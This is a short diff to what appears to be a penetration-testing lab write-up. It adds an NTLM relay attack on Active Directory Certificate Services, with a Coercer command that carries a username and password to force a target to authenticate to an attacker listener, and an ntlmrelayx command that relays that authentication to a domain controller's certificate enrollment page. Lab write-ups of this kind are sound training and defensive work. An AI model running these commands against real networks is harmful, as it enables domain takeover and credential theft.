@@ -759,6 +759,8 @@ Enrollment:
 
 ### Checking the Certificate Web Enrollment endpoint
 
+## DC2:10.1.251.13
+
 \`\`\`text
 curl -s -I http://10.1.251.13/certsrv/certfnsh.asp
 
@@ -768,6 +770,19 @@ Content-Type: text/html
 Server: Microsoft-IIS/10.0
 WWW-Authenticate: Negotiate
 WWW-Authenticate: NTLM
+\`\`\`
+
+\`\`\`text
+coercer coerce -u mike.silver -p HackSmarter123 -l 10.200.51.102 -t 10.1.44.140 --always-continue
+       ______
+      / ____/___  ___  _____________  _____
+     / /   / __ \/ _ \/ ___/ ___/ _ \/ ___/
+    / /___/ /_/ /  __/ /  / /__/  __/ /      v2.4.3
+    \____/\____/\___/_/   \___/\___/_/       by @podalirius_
+\`\`\`
+
+\`\`\`text
+./ntlmrelayx.py -t http://DC2.dismay.hsm/certsrv/certfnsh.asp -smb2support --adcs --template KerberosAuthentication --no-http-server --no-wcf-server --no-raw-server
 \`\`\`
 
 ### Hash for DC1
